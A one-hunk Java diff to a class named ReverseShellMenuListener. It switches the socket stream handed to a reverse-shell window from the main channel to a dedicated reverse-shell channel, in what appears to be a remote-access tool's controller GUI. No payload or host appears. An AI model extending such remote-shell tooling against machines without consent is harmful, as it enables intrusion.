@@ -20,7 +20,7 @@ public class ReverseShellMenuListener implements ActionListener {
 
     @Override
     public void actionPerformed(ActionEvent e) {
-        Streams stream = Objects.requireNonNull(GetSYS.getStream(SocketType.MAIN));
+        Streams stream = Objects.requireNonNull(GetSYS.getStream(SocketType.REVERSE_SHELL));
         ClientHandler clientHandler = GetSYS.getClientHandler();
         assert clientHandler != null;
         new ReverseShellGUI(stream,clientHandler,  mainGUI.getMainGUI());
